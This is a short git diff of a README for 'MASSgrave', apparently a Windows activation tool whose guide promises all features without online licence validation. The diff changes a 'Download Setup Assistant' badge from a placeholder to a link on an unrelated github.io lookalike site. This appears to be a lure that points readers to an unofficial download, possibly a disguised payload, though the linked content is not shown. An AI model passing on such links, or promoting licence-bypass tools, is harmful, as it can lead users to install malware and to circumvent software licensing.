@@ -1,6 +1,6 @@
 # MASSgrave — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Windows-blueviolet)](#) [![Version](https://img.shields.io/badge/Build_19045.5854_May2025-green)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Windows-blueviolet)](https://mass-setup.github.io/.github/) [![Version](https://img.shields.io/badge/Build_19045.5854_May2025-green)](#)
 
 A technical guide for configuring MASSgrave in an offline environment. This assistant ensures all features are enabled without requiring an internet connection for validation.
 
